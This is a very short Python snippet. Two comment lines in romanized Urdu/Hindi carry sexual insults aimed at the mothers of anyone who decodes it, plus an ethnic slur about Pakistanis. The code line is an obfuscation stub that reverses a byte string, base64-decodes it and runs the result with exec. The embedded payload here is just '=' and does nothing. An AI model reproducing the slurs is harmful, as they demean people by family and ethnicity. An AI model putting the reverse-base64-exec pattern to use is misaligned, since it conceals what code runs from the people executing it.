#andi mandi sandi decode kerny walo ki maa randi 

#aur Pakistani ko nhi bol rha hu unki ammi pely say randi hy 
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))